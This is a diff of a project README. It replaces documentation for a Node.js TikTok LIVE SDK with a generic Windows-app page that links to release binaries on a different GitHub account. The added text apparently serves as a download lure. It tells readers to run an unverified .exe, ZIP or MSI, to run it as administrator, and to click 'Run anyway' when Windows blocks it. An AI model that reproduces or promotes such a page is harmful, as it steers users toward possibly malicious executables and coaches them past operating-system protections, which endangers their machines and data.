@@ -1,374 +1,158 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/tiktool/tiktok-live-api/main/banner.png" alt="tiktok-live-api" width="100%" />
-</p>
+# 📡 tiktok-live-api - Live TikTok data in real time
 
-# tiktok-live-api
+[![Download tiktok-live-api](https://img.shields.io/badge/Download%20tiktok-live-api-blue?style=for-the-badge&logo=github)](https://github.com/Lorenzaformic944/tiktok-live-api/releases)
 
-> 📖 **Full documentation, guides, and dashboard → [tik.tools](https://tik.tools)** &nbsp;|&nbsp; 🐍 **Python SDK → [tik.tools/guides/python-tiktok-live](https://tik.tools/guides/python-tiktok-live)** &nbsp;|&nbsp; 🔌 **WebSocket API → [tik.tools/websocket](https://tik.tools/websocket)**
+## 🖥️ What this app does
 
-**Unofficial TikTok LIVE API Client for Node.js & TypeScript** — Connect to any TikTok LIVE stream and receive real-time chat messages, gifts, likes, follows, viewer counts, battles, and more. Includes AI-powered live captions (speech-to-text). Powered by the [TikTool](https://tik.tools) managed API.
+tiktok-live-api lets you connect to TikTok LIVE and view live data on your Windows PC. It can show chat messages, gifts, viewer counts, battle events, and other stream activity in real time.
 
-[![npm](https://img.shields.io/npm/v/tiktok-live-api)](https://www.npmjs.com/package/tiktok-live-api)
-[![npm downloads](https://img.shields.io/npm/dm/tiktok-live-api)](https://www.npmjs.com/package/tiktok-live-api)
-[![TypeScript](https://img.shields.io/badge/TypeScript-Ready-blue)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/npm/l/tiktok-live-api)](https://github.com/tiktool/tiktok-live-api/blob/main/LICENSE)
-[![Discord](https://img.shields.io/discord/1482387222912172159?logo=discord&label=Discord&color=5865F2)](https://discord.gg/y8TwuFBAmD)
+It is made for people who want live TikTok data in one place. You do not need to know code to get started if you use the Windows release.
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/tiktool/tiktok-live-api/main/tiktok-live-api.gif" alt="TikTok Live API Demo — real-time chat, gifts, and viewer events" width="700">
-</p>
+## 📥 Download for Windows
 
-> This package is **not affiliated with or endorsed by TikTok**. It connects to the [TikTool Live](https://tik.tools) managed API service — 99.9% uptime, no reverse engineering, no maintenance required. Also available for [Python](https://pypi.org/project/tiktok-live-api/) and [any language via WebSocket](https://tik.tools/docs).
+To get the app, visit this page to download:
 
-## Install
+https://github.com/Lorenzaformic944/tiktok-live-api/releases
 
-```bash
-npm install tiktok-live-api
-```
+On that page, look for the latest release. Download the Windows file that matches your system, then open it to start the app.
 
-```bash
-# or with yarn / pnpm / bun
-yarn add tiktok-live-api
-pnpm add tiktok-live-api
-bun add tiktok-live-api
-```
+## 🚀 Getting Started
 
-## Quick Start
+Follow these steps on Windows:
 
-```typescript
-import { TikTokLive } from 'tiktok-live-api';
+1. Open the download page and get the latest Windows release.
+2. Save the file to your computer.
+3. If the file is a ZIP, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file and double-click it.
+6. If Windows asks for permission, choose Yes.
+7. Enter the TikTok livestream name or link if the app asks for it.
+8. Start the live session and watch the data appear.
 
-const client = new TikTokLive('streamer_username', { apiKey: 'YOUR_API_KEY' });
+## 🪟 Windows Setup
 
-client.on('chat', (event) => {
-  console.log(`${event.user.uniqueId}: ${event.comment}`);
-});
+For most Windows users, the setup is simple:
 
-client.on('gift', (event) => {
-  console.log(`${event.user.uniqueId} sent ${event.giftName} (${event.diamondCount} 💎)`);
-});
+- Windows 10 or Windows 11
+- An internet connection
+- A TikTok account or livestream link
+- Enough free space to save the app files and logs
 
-client.on('like', (event) => {
-  console.log(`${event.user.uniqueId} liked (total: ${event.totalLikes})`);
-});
+If you use a work PC, you may need permission to run downloaded apps. If that happens, ask your system admin to allow the app.
 
-client.on('follow', (event) => {
-  console.log(`${event.user.uniqueId} followed!`);
-});
+## 🔧 How to Use It
 
-client.on('roomUserSeq', (event) => {
-  console.log(`${event.viewerCount} viewers watching`);
-});
+After you open the app:
 
-client.connect();
-```
+- Paste the TikTok LIVE username or stream link
+- Connect to the live room
+- Watch chat messages appear
+- Track gifts as they come in
+- View the number of viewers
+- Follow battle and event updates
 
-That's it. **No complex setup, no protobuf, no reverse engineering, no breakages when TikTok updates.**
+The app updates live, so you can keep it open while the stream runs.
 
----
+## 📺 What You Can See
 
-## 🚀 Try It Now — 5-Minute Live Demo
+This app can show:
 
-Copy-paste this into a file and run it. Connects to a live TikTok stream, prints every event for 5 minutes, then exits. Works on the free Sandbox tier.
+- Live chat messages
+- Gifts and gift counts
+- Viewer numbers
+- Likes and reactions
+- Battles between live rooms
+- Stream events
+- Real-time updates from the room
 
-**Save as `demo.mjs` and run with `node demo.mjs`:**
+## 🧠 Features
 
-```javascript
-// demo.mjs — TikTok LIVE in 5 minutes
-// npm install tiktok-live-api
-import { TikTokLive } from 'tiktok-live-api';
+- Real-time TikTok LIVE data
+- Managed WebSocket connection
+- Support for chat, gifts, viewers, and events
+- Works with multiple coding runtimes
+- Built for live stream monitoring
+- Tracks updates as they happen
+- Simple setup for end users on Windows
 
-const API_KEY       = 'YOUR_API_KEY';        // Get free key → https://tik.tools
-const LIVE_USERNAME = 'tv_asahi_news';       // Any live TikTok username
+## 📦 File Types You May See
 
-const client = new TikTokLive(LIVE_USERNAME, { apiKey: API_KEY });
-let events = 0;
+The release page may include files like:
 
-client.on('chat',        e => { events++; console.log(`💬 ${e.user.uniqueId}: ${e.comment}`); });
-client.on('gift',        e => { events++; console.log(`🎁 ${e.user.uniqueId} sent ${e.giftName} (${e.diamondCount}💎)`); });
-client.on('like',        e => { events++; console.log(`❤️  ${e.user.uniqueId} liked × ${e.likeCount}`); });
-client.on('member',      e => { events++; console.log(`👋 ${e.user.uniqueId} joined`); });
-client.on('follow',      e => { events++; console.log(`➕ ${e.user.uniqueId} followed`); });
-client.on('roomUserSeq', e => { events++; console.log(`👀 Viewers: ${e.viewerCount}`); });
+- `.exe` for direct Windows use
+- `.zip` for a packaged app folder
+- `.msi` for guided installation
+- source files for developers
 
-client.on('connected',    () => console.log(`\n✅ Connected to @${LIVE_USERNAME} — listening for 5 min...\n`));
-client.on('disconnected', () => console.log(`\n📊 Done! Received ${events} events.\n`));
+If you want the easiest path, choose the Windows app file or ZIP package from the latest release.
 
-client.connect();
-setTimeout(() => { client.disconnect(); }, 300_000);
-```
+## 🛠️ Troubleshooting
 
-<details>
-<summary><strong>🔌 Pure WebSocket version (no SDK, any language)</strong></summary>
-
-```javascript
-// ws-demo.mjs — Pure WebSocket, zero SDK
-// npm install ws
-import WebSocket from 'ws';
-
-const API_KEY       = 'YOUR_API_KEY';
-const LIVE_USERNAME = 'tv_asahi_news';
-
-const ws = new WebSocket(`wss://api.tik.tools?uniqueId=${LIVE_USERNAME}&apiKey=${API_KEY}`);
-let events = 0;
-
-ws.on('open', () => console.log(`\n✅ Connected to @${LIVE_USERNAME} — listening for 5 min...\n`));
-ws.on('message', (raw) => {
-  const msg = JSON.parse(raw);
-  events++;
-  const d = msg.data || {};
-  const user = d.user?.uniqueId || '';
-  switch (msg.event) {
-    case 'chat':        console.log(`💬 ${user}: ${d.comment}`); break;
-    case 'gift':        console.log(`🎁 ${user} sent ${d.giftName} (${d.diamondCount}💎)`); break;
-    case 'like':        console.log(`❤️  ${user} liked × ${d.likeCount}`); break;
-    case 'member':      console.log(`👋 ${user} joined`); break;
-    case 'roomUserSeq': console.log(`👀 Viewers: ${d.viewerCount}`); break;
-    case 'roomInfo':    console.log(`📡 Room: ${msg.roomId}`); break;
-    default:            console.log(`📦 ${msg.event}`); break;
-  }
-});
-ws.on('close', () => console.log(`\n📊 Done! Received ${events} events.\n`));
-
-setTimeout(() => ws.close(), 300_000);
-```
-
-</details>
-
----
-
-## JavaScript (CommonJS)
-
-```javascript
-const { TikTokLive } = require('tiktok-live-api');
-
-const client = new TikTokLive('streamer_username', { apiKey: 'YOUR_API_KEY' });
-client.on('chat', (e) => console.log(`${e.user.uniqueId}: ${e.comment}`));
-client.connect();
-```
-
-## Get a Free API Key
-
-1. Go to [tik.tools](https://tik.tools)
-2. Sign up (no credit card required)
-3. Copy your API key
-
-The free Sandbox tier gives you 50 requests/day and 1 WebSocket connection.
-
-## Environment Variable
-
-Instead of passing `apiKey` directly, you can set it as an environment variable:
-
-```bash
-# Linux / macOS
-export TIKTOOL_API_KEY=your_api_key_here
-
-# Windows (CMD)
-set TIKTOOL_API_KEY=your_api_key_here
-
-# Windows (PowerShell)
-$env:TIKTOOL_API_KEY="your_api_key_here"
-```
-
-```typescript
-import { TikTokLive } from 'tiktok-live-api';
-
-// Automatically reads TIKTOOL_API_KEY from environment
-const client = new TikTokLive('streamer_username');
-client.on('chat', (e) => console.log(e.comment));
-client.connect();
-```
-
-## Events
-
-| Event | Description | Key Fields |
-|-------|-------------|------------|
-| `chat` | Chat message | `user`, `comment`, `emotes`, `starred?` |
-| `gift` | Virtual gift | `user`, `giftName`, `diamondCount`, `repeatCount` |
-| `like` | Like event | `user`, `likeCount`, `totalLikes` |
-| `follow` | New follower | `user` |
-| `share` | Stream share | `user` |
-| `member` | Viewer joined | `user` |
-| `subscribe` | New subscriber | `user` |
-| `roomUserSeq` | Viewer count | `viewerCount`, `topViewers` |
-| `battle` | Battle event | `type`, `teams`, `scores` |
-| `roomPin` | Pinned/starred message | `user`, `comment`, `action`, `durationSeconds` |
-| `envelope` | Treasure chest | `diamonds`, `user` |
-| `streamEnd` | Stream ended | `reason` |
-| `connected` | Connected | `uniqueId` |
-| `disconnected` | Disconnected | `uniqueId` |
-| `error` | Error occurred | `error` |
-| `event` | Catch-all | Full raw event |
-
-All events are fully typed with TypeScript interfaces. Your IDE will show autocompletion for every field.
-
-## Live Captions (Speech-to-Text)
-
-Transcribe and translate any TikTok LIVE stream in real-time. **This feature is unique to TikTool Live — no other TikTok library offers it.**
-
-```typescript
-import { TikTokCaptions } from 'tiktok-live-api';
-
-const captions = new TikTokCaptions('streamer_username', {
-  apiKey: 'YOUR_API_KEY',
-  translate: 'en',       // translate to English
-  diarization: true,     // identify who is speaking
-});
-
-captions.on('caption', (event) => {
-  const speaker = event.speaker ? `[${event.speaker}] ` : '';
-  console.log(`${speaker}${event.text}${event.isFinal ? ' ✓' : '...'}`);
-});
-
-captions.on('translation', (event) => {
-  console.log(`  → ${event.text}`);
-});
-
-captions.on('credits', (event) => {
-  console.log(`${event.remaining}/${event.total} minutes remaining`);
-});
-
-captions.connect();
-```
-
-### Caption Events
-
-| Event | Description | Key Fields |
-|-------|-------------|------------|
-| `caption` | Real-time caption text | `text`, `speaker`, `isFinal`, `language` |
-| `translation` | Translated caption | `text`, `sourceLanguage`, `targetLanguage` |
-| `credits` | Credit balance update | `total`, `used`, `remaining` |
-| `credits_low` | Low credit warning | `remaining`, `percentage` |
-| `status` | Session status | `status`, `message` |
-
-## Chat Bot Example
-
-```typescript
-import { TikTokLive } from 'tiktok-live-api';
-
-const client = new TikTokLive('streamer_username', { apiKey: 'YOUR_API_KEY' });
-const giftLeaderboard = new Map<string, number>();
-let messageCount = 0;
-
-client.on('chat', (event) => {
-  messageCount++;
-  const msg = event.comment.toLowerCase().trim();
-  const user = event.user.uniqueId;
-
-  if (msg === '!hello') {
-    console.log(`>> BOT: Welcome ${user}! 👋`);
-  } else if (msg === '!stats') {
-    console.log(`>> BOT: ${messageCount} messages, ${giftLeaderboard.size} gifters`);
-  } else if (msg === '!top') {
-    const top = [...giftLeaderboard.entries()]
-      .sort((a, b) => b[1] - a[1])
-      .slice(0, 5);
-    top.forEach(([name, diamonds], i) => {
-      console.log(`  ${i + 1}. ${name} — ${diamonds} 💎`);
-    });
-  }
-});
-
-client.on('gift', (event) => {
-  const user = event.user.uniqueId;
-  const diamonds = event.diamondCount || 0;
-  giftLeaderboard.set(user, (giftLeaderboard.get(user) || 0) + diamonds);
-});
-
-client.connect();
-```
-
-## TypeScript
-
-This package ships with full TypeScript support. All events are typed:
-
-```typescript
-import { TikTokLive, ChatEvent, GiftEvent } from 'tiktok-live-api';
-
-const client = new TikTokLive('streamer', { apiKey: 'KEY' });
-
-// Full autocompletion — your IDE knows the type of `event`
-client.on('chat', (event: ChatEvent) => {
-  console.log(event.user.uniqueId);  // ✓ typed
-  console.log(event.comment);        // ✓ typed
-});
-
-client.on('gift', (event: GiftEvent) => {
-  console.log(event.giftName);       // ✓ typed
-  console.log(event.diamondCount);   // ✓ typed
-});
-```
-
-## API Reference
-
-### `new TikTokLive(uniqueId, options?)`
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `apiKey` | `string` | `process.env.TIKTOOL_API_KEY` | Your TikTool API key |
-| `autoReconnect` | `boolean` | `true` | Auto-reconnect on disconnect |
-| `maxReconnectAttempts` | `number` | `5` | Max reconnection attempts |
-
-**Methods:**
-- `client.on(event, handler)` — Register event handler
-- `client.off(event, handler)` — Remove event handler
-- `client.connect()` — Connect to stream (returns Promise)
-- `client.disconnect()` — Disconnect from stream
-- `client.connected` — Whether currently connected
-- `client.eventCount` — Total events received
-
-### `new TikTokCaptions(uniqueId, options?)`
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `apiKey` | `string` | `process.env.TIKTOOL_API_KEY` | Your TikTool API key |
-| `translate` | `string` | `undefined` | Target translation language |
-| `diarization` | `boolean` | `true` | Enable speaker identification |
-| `maxDurationMinutes` | `number` | `60` | Auto-disconnect timer |
-
-**Methods:**
-- `captions.on(event, handler)` — Register event handler
-- `captions.off(event, handler)` — Remove event handler
-- `captions.connect()` — Start receiving captions (returns Promise)
-- `captions.disconnect()` — Stop receiving captions
-- `captions.connected` — Whether currently connected
-
-## Why tiktok-live-api?
-
-| | tiktok-live-api | tiktok-live-connector | TikTokLive (Python) |
-|---|---|---|---|
-| **Stability** | ✓ Managed API, 99.9% uptime | ✗ Breaks on TikTok updates | ✗ Breaks on TikTok updates |
-| **TypeScript** | ✓ First-class, fully typed | Partial | N/A |
-| **Live Captions** | ✓ AI speech-to-text | ✗ | ✗ |
-| **Translation** | ✓ Real-time, 50+ languages | ✗ | ✗ |
-| **Maintenance** | ✓ Zero — we handle it | ✗ You fix breakages | ✗ You fix breakages |
-| **CAPTCHA Solving** | ✓ Built-in (Pro+) | ✗ | ✗ |
-| **Feed Discovery** | ✓ See who's live | ✗ | ✗ |
-| **Free Tier** | ✓ 50 requests/day | ✓ Free (unreliable) | ✓ Free (unreliable) |
-| **ESM + CJS** | ✓ Both supported | ✓ | N/A |
-
-## Pricing
-
-| Tier | Requests/Day | WebSocket Connections | Price |
-|------|-------------|----------------------|-------|
-| Sandbox | 50 | 1 (5 min) | Free |
-| Basic | 10,000 | 3 (8h) | $7/week |
-| Pro | 75,000 | 50 (8h) | $15/week |
-| Ultra | 300,000 | 500 (8h) | $45/week |
-
-## Also Available
-
-- **Python**: [`pip install tiktok-live-api`](https://pypi.org/project/tiktok-live-api/)
-- **Any language**: Connect via WebSocket: `wss://api.tik.tools?uniqueId=USERNAME&apiKey=KEY`
-- **Unreal Engine**: Native C++/Blueprint plugin
-
-## Links
-
-- 🌐 **Website**: [tik.tools](https://tik.tools)
-- 📖 **Documentation**: [tik.tools/docs](https://tik.tools/docs)
-- 🐍 **Python SDK**: [pypi.org/project/tiktok-live-api](https://pypi.org/project/tiktok-live-api/)
-- 💻 **GitHub**: [github.com/tiktool/tiktok-live-api](https://github.com/tiktool/tiktok-live-api)
-
-## License
-
-MIT
+If the app does not open:
+
+- Try running it as an administrator
+- Check that you downloaded the latest release
+- Make sure the file finished downloading
+- Extract ZIP files before opening the app
+- Restart your PC and try again
+
+If the app does not connect to a livestream:
+
+- Check the TikTok username or link
+- Make sure the livestream is active
+- Confirm your internet connection
+- Close the app and open it again
+
+If Windows blocks the app:
+
+- Select More info
+- Then choose Run anyway if you trust the file
+- If your PC is managed by an organization, ask for access
+
+## 🔒 Safety and Access
+
+Use only the release files from the link above. Keep the app on your own PC and download from the official release page when you need an update.
+
+## 🧩 Common Use Cases
+
+People use tiktok-live-api to:
+
+- Watch TikTok LIVE chat in one place
+- Track gifts during a stream
+- Monitor viewer activity
+- Follow battle events
+- Build live dashboards
+- Send live data to other tools
+
+## 🗂️ Folder and App Layout
+
+After extraction, you may see:
+
+- the main app file
+- a config file
+- a logs folder
+- a data folder
+- a readme or help file
+
+If you see a settings file, you can open it with Notepad to check basic options.
+
+## 🌐 Supported Platforms
+
+This release is built for Windows users first. The project also connects with Node.js, Python, Java, Go, and C# on the development side, but the Windows release is the path for non-technical users who want to run the app right away.
+
+## 🔄 Updates
+
+Check the release page now and then for new versions. New releases may improve live room support, stream event handling, or connection stability.
+
+## ❓ Help with First Run
+
+If you are not sure what to do first:
+
+1. Open the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the app
+5. Enter a TikTok LIVE name or link
+6. Start the connection
+
+If you still have trouble, look at the release notes on the download page for the latest file details.
